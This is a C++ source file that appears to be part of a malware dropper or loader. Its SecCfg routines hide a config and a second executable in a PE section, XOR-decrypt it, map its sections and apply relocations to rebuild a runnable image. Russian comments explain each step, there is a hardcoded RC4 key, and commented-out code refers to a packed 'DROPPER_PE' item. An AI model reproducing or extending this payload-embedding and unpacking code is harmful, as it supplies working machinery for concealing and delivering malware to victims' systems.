#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <shlwapi.h>
#include <psapi.h>
#include <imagehlp.h>
#include <tlhelp32.h>
#include <Shlwapi.h>
#include <shlobj.h>

#include "utils.h"
#include "seccfg.h"
#include "peldr.h"

// SecCfg
//----------------------------------------------------------------------------------------------------------------------------------------------------
#define CRYPT_KEY char rc4key[] = "dDjquW83@3eFmzp";

BOOLEAN SecCfg::InsertSectionConfig(PSECTION_CONFIG SectionConfig, PVOID Image, DWORD ImageSize, PVOID *ResultImage, DWORD *ResultImageSize, BOOLEAN VA)
{
	BOOLEAN Result = FALSE;
	DWORD DataSize;
	PVOID Data;

	DataSize = sizeof(SECTION_CONFIG_RAW) + SectionConfig->Raw.ConfigSize + SectionConfig->Raw.ImageSize;
	Data = malloc(DataSize);
	if (Data)
	{
		CopyMemory(Data, &SectionConfig->Raw, sizeof(SECTION_CONFIG_RAW));

		CopyMemory(RtlOffsetToPointer(Data, sizeof(SECTION_CONFIG_RAW)), SectionConfig->Config, SectionConfig->Raw.ConfigSize);
		CopyMemory(RtlOffsetToPointer(Data, sizeof(SECTION_CONFIG_RAW) + SectionConfig->Raw.ConfigSize), SectionConfig->Image, SectionConfig->Raw.ImageSize);

		Result = PeLdr::InsertSection(SectionConfig->Name, Data, DataSize, Image, ImageSize, ResultImage, ResultImageSize, VA);

		free(Data);
	}
	/*MiniStorage::STORAGE* st = MiniStorage::_createEmpty();
	MiniStorage::_addItemAsUtf8StringA(&st, MiniStorage::ID_CONFIG_TXT, MiniStorage::ITEMF_COMBINE_OVERWRITE|MiniStorage::ITEMF_IS_SETTING, (LPSTR)SectionConfig->Config);
	MiniStorage::_addItem(&st, MiniStorage::ID_DROPPER_PE, MiniStorage::ITEMF_COMBINE_OVERWRITE|MiniStorage::ITEMF_IS_PE_FILE, Image, ImageSize);
	CRYPT_KEY
	DWORD r = MiniStorage::_pack(&st, MiniStorage::PACKF_FINAL_MODE, rc4key);
	Result = PeLdr::InsertSection(SectionConfig->Name, st, r, Image, ImageSize, ResultImage, ResultImageSize, VA);*/

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN SecCfg::GetSectionConfig(PSECTION_CONFIG SectionConfig, PVOID Image)
{
	BOOLEAN Result = FALSE;
	PIMAGE_SECTION_HEADER SectionHeader;
	PSECTION_CONFIG_RAW ConfigHeader;

	SectionHeader = PeLdr::PeSearchSection(Image, SectionConfig->Name);
	if (SectionHeader)
	{
		ConfigHeader = MAKE_PTR(Image, SectionHeader->VirtualAddress, PSECTION_CONFIG_RAW);

		//// Копируем рав конфиг там размер имейджа и конфига
		CopyMemory(&SectionConfig->Raw, ConfigHeader, sizeof(SECTION_CONFIG_RAW));

		// Указатели на имейдж и конфиг
		SectionConfig->Config = RtlOffsetToPointer(ConfigHeader, sizeof(SECTION_CONFIG_RAW));
		SectionConfig->Image = RtlOffsetToPointer(ConfigHeader, sizeof(SECTION_CONFIG_RAW) + ConfigHeader->ConfigSize);
		if(((LPWORD)SectionConfig->Image)[0] != 0x5A4D) {DWORD first = ((LPWORD)SectionConfig->Image)[0]; DbgMsg("Decrypting: 0x%X, XOR key: 0x%X\r\n", first, ConfigHeader->XorKey); Utils::XorCrypt(SectionConfig->Config, ConfigHeader->ConfigSize + ConfigHeader->ImageSize, ConfigHeader->XorKey);}

		Result = TRUE;
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

PVOID SecCfg::LoadImageSections(PVOID ImageBaseRaw, DWORD *ImageSize)
{
	PVOID Result = NULL;
	
	PIMAGE_NT_HEADERS NtHeaders = PeLdr::PeImageNtHeader(ImageBaseRaw);

	DWORD SizeOfImage;
	if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) SizeOfImage = ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.SizeOfImage;
	if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) SizeOfImage = ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.SizeOfImage;

	if (NtHeaders)
	{
		Result = malloc(SizeOfImage);
		if (Result)
		{
			*ImageSize = SizeOfImage;

			PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);

			CopyMemory(Result, ImageBaseRaw, Section->PointerToRawData);

			for (WORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
			{
				ZeroMemory(RtlOffsetToPointer(Result, Section[i].VirtualAddress), Section[i].Misc.VirtualSize);
				CopyMemory(RtlOffsetToPointer(Result, Section[i].VirtualAddress), RtlOffsetToPointer(ImageBaseRaw, Section[i].PointerToRawData), Section[i].SizeOfRawData);
			}
		}
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN SecCfg::ConvertImageToImage(PVOID ImageBase, SecCfg::PSECTION_CONFIG SectionConfig, PVOID *ResultImage, DWORD *ResultImageSize, BOOLEAN Load64)
{
	BOOLEAN Result = FALSE;
	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_SECTION_HEADER LastSection;
	SECTION_CONFIG NewSectionConfig;
	PVOID NewImageBase;
	DWORD NewImageSize;

	NtHeaders = PeLdr::PeImageNtHeader(ImageBase);
	if (NtHeaders)
	{
		LastSection = PeLdr::GetVirtualyLastSectionHeader(NtHeaders);

		DWORD SizeOfImage;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) SizeOfImage = ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.SizeOfImage;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) SizeOfImage = ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.SizeOfImage;

		// Новый конфиг размер имейджа = старый имейдж минус размер последней секции
		NewSectionConfig.Raw.ImageSize = SizeOfImage - LastSection->Misc.VirtualSize;
		NewSectionConfig.Image = malloc(NewSectionConfig.Raw.ImageSize);
		if (NewSectionConfig.Image)
		{
			// Копируем все без последней секции
			CopyMemory(NewSectionConfig.Image, ImageBase, NewSectionConfig.Raw.ImageSize);
			// Релокаем старый к дефолтной базе (новая база из хидера - старая база (текущая))
			if (PeLdr::PeProcessRelocs(NewSectionConfig.Image, (DWORD64)PeLdr::PeGetImageBase(ImageBase) - (DWORD64)ImageBase))
			{
				NtHeaders = PeLdr::PeImageNtHeader(NewSectionConfig.Image);
				LastSection = PeLdr::GetVirtualyLastSectionHeader(NtHeaders);

				// Фиксим заголовок размер имейджа
				if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.SizeOfImage -= LastSection->Misc.VirtualSize;
				if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.SizeOfImage -= LastSection->Misc.VirtualSize;

				// Обнуляем последнею секцию
				ZeroMemory(LastSection, sizeof(IMAGE_SECTION_HEADER));

				// -1 секцию (конфиг в старом имейдже)
				NtHeaders->FileHeader.NumberOfSections--;

				// Конфиг нового имейджа мутим туда старый конфиг
				NewSectionConfig.Name = SECCFG_SECTION_NAME;
				NewSectionConfig.Raw.ConfigSize = SectionConfig->Raw.ConfigSize;
				NewSectionConfig.Config = SectionConfig->Config;

				if (Load64)
				{
					// Если первый запуск нужно прогрузить секции 64 имейджа по вирутальным адресам
					NewImageBase = LoadImageSections(SectionConfig->Image, &NewImageSize);
				}
				else
				{
					NewImageBase = SectionConfig->Image;
					NewImageSize = SectionConfig->Raw.ImageSize;
				}

				if (NewImageBase)
				{
					// Вставляем наш новый конфиг со старым имейджем в новый имейдж со старого конфига (секция будет добавлена по вирутальному адресу)
					if (InsertSectionConfig(&NewSectionConfig, NewImageBase, NewImageSize, ResultImage, ResultImageSize, TRUE))
					{
						Result = PeLdr::PeProcessRelocs(*ResultImage, (DWORD64)*ResultImage - PeLdr::PeGetImageBase(*ResultImage));
					}

					if (Load64) free(NewImageBase);
				}
			}

			free(NewSectionConfig.Image);
		}
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOLEAN SecCfg::GetImageFromImage(PVOID ImageBase, PVOID *ResultImageBase, DWORD *ResultImageSize, BOOLEAN Load64)
{
	BOOLEAN Result = FALSE;
	SECTION_CONFIG SectionConfig;

	SectionConfig.Name = SECCFG_SECTION_NAME;
	if (GetSectionConfig(&SectionConfig, ImageBase))
	{
		Result = ConvertImageToImage(ImageBase, &SectionConfig, ResultImageBase, ResultImageSize, Load64);
	}

	return Result;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
